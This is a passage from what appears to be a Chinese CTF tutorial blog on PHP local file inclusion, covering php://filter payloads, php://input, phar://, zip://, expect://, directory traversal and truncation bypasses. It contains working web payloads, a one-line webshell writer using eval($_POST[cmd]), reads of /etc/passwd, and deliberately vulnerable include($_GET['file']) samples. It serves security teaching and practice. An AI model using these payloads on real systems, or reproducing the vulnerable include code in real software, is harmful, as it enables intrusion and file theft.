</span></span><span class="line"><span class="cl">resource=1.php：这部分指定了要处理的资源
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">但是这里的话需要注意，filter伪协议不能搭配我们的通配符去使用，对于 php://filter 这种用于数据过滤和流处理的伪协议，一般不支持通配符操作。
</span></span></code></pre></td></tr></table>
</div>
</div><p>我们还可以进行其它编码，我可以配合过滤器使用</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">过滤器（Filter） 是一种用于处理数据流的程序或函数，它接收输入数据，对其进行特定转换或筛选，并输出处理后的结果。在php中，过滤器分为字符串过滤器、转换过滤器、压缩过滤器以及加密过滤器。
</span></span></code></pre></td></tr></table>
</div>
</div><p>参考：<a class="link" href="https://www.php.net/manual/zh/filters.string.php"  target="_blank" rel="noopener"
    >PHP: 字符串过滤器 - Manual</a></p>
<p><a class="link" href="https://blog.csdn.net/JL20050725/article/details/150420908"  target="_blank" rel="noopener"
    >php://filter伪协议（总结）与死亡代码的绕过_php伪协议filter之&amp;txt=-CSDN博客</a></p>
<h4 id="convert转换过滤器">convert转换过滤器
</h4><p>作用：对数据流进行编码，通常用来读取文件源码。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">convert.base64-encode：将内容 Base64 编码。
</span></span><span class="line"><span class="cl">convert.base64-decode：将 Base64 内容解码。
</span></span><span class="line"><span class="cl">convert.quoted-printable-encode：引号可打印编码。
</span></span><span class="line"><span class="cl">convert.quoted-printable-decode：引号可打印解码。
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">convert.iconv.*：一种字符编码转换过滤器
</span></span><span class="line"><span class="cl">语法；
</span></span><span class="line"><span class="cl">convert.iconv.目标编码/源编码			convert.iconv.UTF-8/GBK	
</span></span><span class="line"><span class="cl">convert.iconv.源编码.目标编码			convert.iconv.utf8.utf16
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="string字符串过滤器">string字符串过滤器
</h4><p>该类通常以<code>string</code>开头，对每个字符都进行同样方式的处理。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">string</span><span class="o">.</span><span class="n">toupper</span><span class="err">：</span><span class="n">转为大写</span><span class="err">。</span>
</span></span><span class="line"><span class="cl"><span class="n">string</span><span class="o">.</span><span class="n">tolower</span><span class="err">：</span><span class="n">转为小写</span><span class="err">。</span>
</span></span><span class="line"><span class="cl"><span class="n">string</span><span class="o">.</span><span class="n">strip_tags</span><span class="err">：</span><span class="n">这个过滤器就比较有意思</span><span class="err">，</span><span class="n">用来处理掉读入的所有标签</span><span class="err">，</span><span class="n">例如XML的等等</span><span class="err">。</span><span class="n">在绕过死亡exit大有用处</span><span class="err">。</span>
</span></span><span class="line"><span class="cl"><span class="n">string</span><span class="o">.</span><span class="n">rot13</span><span class="err">：</span><span class="n">字符右移十三位</span><span class="err">。</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="加密过滤器">加密过滤器
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">压缩过滤器
</span></span><span class="line"><span class="cl">注意，这里的压缩过滤器指的并不是在数据流传入的时候对整个数据进行写入文件后压缩文件，也不代表可以压缩或者解压数据流。压缩过滤器不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">用到的两个相关过滤器：zlib.deflate（压缩）和 zlib.inflate（解压）。zilb是比较主流的用法，至于bzip2.compress和 bzip2.decompress工作的方式与 zlib 过滤器大致相同。
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php://filter/zlib.deflate|zlib.inflate/resource=flag.php
</span></span><span class="line"><span class="cl">等同于
</span></span><span class="line"><span class="cl">php://filter/resource=flag.php
</span></span></code></pre></td></tr></table>
</div>
</div><p>常用的payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">php</span><span class="p">:</span><span class="o">//</span><span class="nb">filter</span><span class="o">/</span><span class="n">convert</span><span class="o">.</span><span class="n">base64</span><span class="o">-</span><span class="n">encode</span><span class="o">/</span><span class="n">resource</span><span class="o">=</span><span class="n">flag</span><span class="o">.</span><span class="n">php</span>
</span></span><span class="line"><span class="cl"><span class="n">php</span><span class="p">:</span><span class="o">//</span><span class="nb">filter</span><span class="o">/</span><span class="n">convert</span><span class="o">.</span><span class="n">base64</span><span class="o">-</span><span class="n">decode</span><span class="o">/</span><span class="n">resource</span><span class="o">=</span><span class="n">flag</span><span class="o">.</span><span class="n">php</span>
</span></span><span class="line"><span class="cl"><span class="n">php</span><span class="p">:</span><span class="o">//</span><span class="nb">filter</span><span class="o">/</span><span class="n">convert</span><span class="o">.</span><span class="n">quoted</span><span class="o">-</span><span class="n">printable</span><span class="o">-</span><span class="n">encode</span><span class="o">/</span><span class="n">resource</span><span class="o">=</span><span class="n">flag</span><span class="o">.</span><span class="n">php</span>
</span></span><span class="line"><span class="cl"><span class="n">php</span><span class="p">:</span><span class="o">//</span><span class="nb">filter</span><span class="o">/</span><span class="n">convert</span><span class="o">.</span><span class="n">iconv</span><span class="o">.</span><span class="n">UTF</span><span class="o">-</span><span class="mi">8</span><span class="o">/</span><span class="n">GBK</span><span class="o">/</span><span class="n">resource</span><span class="o">=</span><span class="n">flag</span><span class="o">.</span><span class="n">php</span>
</span></span><span class="line"><span class="cl"><span class="n">php</span><span class="p">:</span><span class="o">//</span><span class="nb">filter</span><span class="o">/</span><span class="n">convert</span><span class="o">.</span><span class="n">iconv</span><span class="o">.</span><span class="n">UTF</span><span class="o">-</span><span class="mf">8.</span><span class="n">UTF</span><span class="o">-</span><span class="mi">16</span><span class="o">/</span><span class="n">resource</span><span class="o">=</span><span class="n">flag</span><span class="o">.</span><span class="n">php</span>
</span></span><span class="line"><span class="cl"><span class="n">php</span><span class="p">:</span><span class="o">//</span><span class="nb">filter</span><span class="o">/</span><span class="n">zlib</span><span class="o">.</span><span class="n">deflate</span><span class="o">|</span><span class="n">zlib</span><span class="o">.</span><span class="n">inflate</span><span class="o">/</span><span class="n">resource</span><span class="o">=</span><span class="n">flag</span><span class="o">.</span><span class="n">php</span>
</span></span><span class="line"><span class="cl"><span class="n">php</span><span class="p">:</span><span class="o">//</span><span class="nb">filter</span><span class="o">/</span><span class="n">bzip2</span><span class="o">.</span><span class="n">compress</span><span class="o">/</span><span class="n">resource</span><span class="o">=</span><span class="n">flag</span><span class="o">.</span><span class="n">php</span>
</span></span><span class="line"><span class="cl"><span class="n">php</span><span class="p">:</span><span class="o">//</span><span class="nb">filter</span><span class="o">/</span><span class="n">string</span><span class="o">.</span><span class="n">rot13</span><span class="o">/</span><span class="n">resource</span><span class="o">=</span><span class="n">flag</span><span class="o">.</span><span class="n">php</span>
</span></span><span class="line"><span class="cl"><span class="n">php</span><span class="p">:</span><span class="o">//</span><span class="nb">filter</span><span class="o">/</span><span class="n">string</span><span class="o">.</span><span class="n">tolower</span><span class="o">/</span><span class="n">resource</span><span class="o">=</span><span class="n">flag</span><span class="o">.</span><span class="n">php</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>例题：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="mi">2022</span><span class="o">-</span><span class="nx">newstar</span><span class="o">:</span><span class="nx">ez</span><span class="o">-</span><span class="nx">chain</span>
</span></span><span class="line"><span class="cl"><span class="mi">2025</span><span class="o">-</span><span class="nx">swpu</span><span class="o">-</span><span class="nx">nssctf</span><span class="o">:</span><span class="nx">ez_ez_php</span>			<span class="c1">//https://www.nssctf.cn/index
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">2025</span><span class="o">-?</span><span class="nx">CTF</span><span class="o">:</span><span class="nx">Look</span> <span class="nx">at</span> <span class="nx">the</span> <span class="nx">picture</span>		<span class="c1">//https://www.a1natas.com/
</span></span></span></code></pre></td></tr></table>
</div>
</div><h3 id="3input协议文件包含">3.input协议文件包含
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php://input 是个可以访问请求的原始数据的只读流。可以接收post请求作为输入流的输入，将请求作为PHP代码的输入传递给目标变量，以达到以post 的形式进行输入的目的。
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">所以我们可以对参数传入php://input，然后post传入PHP恶意代码
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">另外我们也可以通过文件包含去读取文件内容，注意：执行命令的时候，PHP配置文件只需要开启allow_url_include
</span></span></code></pre></td></tr></table>
</div>
</div><p>举例：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">include</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251120091816597.png"
	width="856"
	height="477"
	srcset="/p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251120091816597_hu_1b708f23b4f7ff14.png 480w, /p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251120091816597_hu_490657c04c297a97.png 1024w"
	loading="lazy"
	
		alt="image-20251120091816597"
	
	
		class="gallery-image" 
		data-flex-grow="179"
		data-flex-basis="430px"
	
></p>
<p>写入木马则打</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="nx">fputs</span><span class="p">(</span><span class="nx">fopen</span><span class="p">(</span><span class="s1">&#39;shell.php&#39;</span><span class="p">,</span><span class="s1">&#39;w&#39;</span><span class="p">),</span><span class="s1">&#39;&lt;?php @eval($_POST[cmd])?&gt;&#39;</span><span class="p">);</span><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251120092012648.png"
	width="1490"
	height="336"
	srcset="/p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251120092012648_hu_1726ef7e0bac2640.png 480w, /p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251120092012648_hu_34e4246d9c73680a.png 1024w"
	loading="lazy"
	
		alt="image-20251120092012648"
	
	
		class="gallery-image" 
		data-flex-grow="443"
		data-flex-basis="1064px"
	
></p>
<p>木马利用成功</p>
<h3 id="4file协议文件包含">4.file协议文件包含
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">file:// 可以访问本地文件系统，读取本地文件的内容
</span></span><span class="line"><span class="cl">使用file:// 不需要开启allow_url_fopen和allow_url_include
</span></span></code></pre></td></tr></table>
</div>
</div><p>举例：还是上面那个题（/etc/passwd是Linux系统账号信息）</p>
<p><img src="/p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251120092550591.png"
	width="1567"
	height="249"
	srcset="/p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251120092550591_hu_dc999b482ff24189.png 480w, /p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251120092550591_hu_8a8cba7e5dad2ed7.png 1024w"
	loading="lazy"
	
		alt="image-20251120092550591"
	
	
		class="gallery-image" 
		data-flex-grow="629"
		data-flex-basis="1510px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">注意：file协议可以绕过open_basedir任意文件绕过
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="5phar伪协议">5.phar://伪协议
</h3><p>phar:// 是用来解压的伪协议
phar://不管参数中是什么拓展名，都会被当做压缩包
用法：<code>?file=phar://压缩包/压缩文件</code>
比如：<code>phar://xxx.png/shell.php</code>
<strong>利用phar:// 时，PHP配置文件需要开启allow_url_fopen和allow_url_include，并且PHP版本要高于5.3.0</strong></p>
<blockquote>
<p><strong>注意：压缩包需要用zip://伪协议压缩而不能用rar://，将木马文件压缩后，改成任意后缀名都可以正常使用</strong></p>
</blockquote>
<p>代码示例如下：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">	<span class="nv">$file</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">	<span class="k">include</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>写一个木马文件shell.php，然后用zip://伪协议压缩成shell.zip，最后修改后缀名为.png，上传图片
输入测试：<code>http://www.abc.com/xxx/file.php?file=phar://shell.png/shell.php</code></p>
<p>这样phar://就会将png当做zip压缩包进行解压，并且访问解压后的shell.php文件</p>
<h3 id="6zip-伪协议zlibbzip2">6.zip:// 伪协议（zlib://，bzip2://）
</h3><p>和phar://伪协议原理类似，但用法不同
用法：<code>?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名]</code>
<strong>利用zip:// 时，PHP配置文件需要开启allow_url_fopen和allow_url_include，并且PHP版本要高于5.3.0</strong></p>
<blockquote>
<p>注意：需要将#转换成URL编码：%23</p>
</blockquote>
<p>代码示例如下：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">	<span class="nv">$file</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">	<span class="k">include</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>输入测试：<code>http://www.abc.com/xxx/file?file=zip://D:/phpstudy/www/.../test.png%23shell.php (zip必须是绝对路径)</code>
这样zip://就会将png当做zip压缩包进行解压，并且访问解压后的shell.php文件</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">这</span><span class="n">zip与phar协议一般ctf都是给一个upload</span><span class="o">+</span><span class="n">include场景</span><span class="err">，但是用</span><span class="n">zip与phar协议可以基本绕过任何文件名后缀上传恶意文</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>作用类似的协议如下只不过要zip配置</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">compress.bzip2://[压缩文件绝对路径或相对路径]
</span></span><span class="line"><span class="cl">compress.zlib://[压缩文件绝对路径或相对路径]
</span></span></code></pre></td></tr></table>
</div>
</div><p>比如下面<strong>zip compression</strong>是enable就是可以用zlib协议，<strong>bzip2 compression</strong>是disabled就是禁用了bzip2协议</p>
<p><img src="/p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251120100648614.png"
	width="1705"
	height="331"
	srcset="/p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251120100648614_hu_91f397c7391218dd.png 480w, /p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251120100648614_hu_433dd58f995be643.png 1024w"
	loading="lazy"
	
		alt="image-20251120100648614"
	
	
		class="gallery-image" 
		data-flex-grow="515"
		data-flex-basis="1236px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">例题：2023极客大挑战：famale_imp_l0ve		//https://www.ctfplus.cn/learning/problem/excellent-problemSet/detail/1954807333217374208
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="7expect伪协议">7.expect://伪协议
</h3><p>expect://伪协议用来执行系统命令，但是需要安装拓展，用法比较小
用法: <code>?file=expect://ls</code></p>
<h3 id="8目录穿越">8.目录穿越
</h3><p>例如</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
</span></span><span class="line"><span class="cl">if(isset($_GET[&#39;file&#39;])){
</span></span><span class="line"><span class="cl">    $file = $_GET[&#39;file&#39;];
</span></span><span class="line"><span class="cl">    include($file);
</span></span><span class="line"><span class="cl">}else{
</span></span><span class="line"><span class="cl">    highlight_file(__FILE__);
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></td></tr></table>
</div>
</div><p>通过目录遍历打<code>file=../../../../etc/passwd</code></p>
<p><img src="/p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251120102428191.png"
	width="1591"
	height="229"
	srcset="/p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251120102428191_hu_388abcebf7ec9bd5.png 480w, /p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251120102428191_hu_2bf414f22896a772.png 1024w"
	loading="lazy"
	
		alt="image-20251120102428191"
	
	
		class="gallery-image" 
		data-flex-grow="694"
		data-flex-basis="1667px"
	
></p>
<p>同理可以得到任意文件，由上面知，当包含php代码时，还能执行其中的代码</p>
<h2 id="二有限制本地文件包含漏洞">二：有限制本地文件包含漏洞
</h2><p>有限制本地文件包含漏洞是指代码中为包含文件指定了特定的前缀或者拓展名，攻击者必须要对前缀或者拓展名过滤，才能达到利用文件包含漏洞读取操作。</p>
<p>比如题目是这样</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-hpp" data-lang="hpp"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="n">php</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="n">isset</span><span class="p">(</span><span class="err">$</span><span class="n">_GET</span><span class="p">[</span><span class="err">&#39;</span><span class="n">file</span><span class="err">&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="err">$</span><span class="n">file</span> <span class="o">=</span> <span class="err">$</span><span class="n">_GET</span><span class="p">[</span><span class="err">&#39;</span><span class="n">file</span><span class="err">&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="n">include</span><span class="p">(</span><span class="err">$</span><span class="n">file</span><span class="p">.</span><span class="err">”</span><span class="p">.</span><span class="n">php</span><span class="err">”</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">highlight_file</span><span class="p">(</span><span class="n">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>那比如我想读1.php，那就只需要传参1就行了，那这时候怎么绕过像正常的无限制本地包含一样去进行</p>
<h4 id="2100截断文件包含">2.1%00截断文件包含
</h4><p><strong>利用条件</strong></p>
<p>这个漏洞的使用必须满足如下条件</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">magic_quotes_gpc=off，PHP版本低于5.3.4
</span></span></code></pre></td></tr></table>
</div>
</div><p>若符合条件直接打如下即可绕过后缀读到/etc/passwd</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">file=../../../../../../etc/passwd%00
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="22路径长度截断文件包含">2.2.路径长度截断文件包含
</h4><p>操作系统存在着最大路径长度的限制。可以输入超过最大路劲长度的目录，这样系统就会将后面的路劲丢弃，导致拓展名截断。</p>
<p>漏洞利用条件</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Windows下最大路径长度为256B
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Linux下最大路径长度为4096B
</span></span></code></pre></td></tr></table>
</div>
</div><p>还是上面的题，测试</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">file=test.txt/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././
</span></span></code></pre></td></tr></table>
</div>
</div><p>执行后发现已经成功截断了后面的拓展名</p>
<h4 id="23点号截断文件包含">2.3.点号截断文件包含
</h4><p>点号截断包含<strong>只使用与Windows系统</strong>，点号的长度大于256B的时候，就可以造成拓展名截断，不过多展示，和上面差不多</p>
<h4 id="24require_once-绕过不能重复包含文件的限制">2.4.require_once 绕过不能重复包含文件的限制
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="k">E_ALL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">require_once</span><span class="p">(</span><span class="s1">&#39;flag.php&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$content</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">];</span>
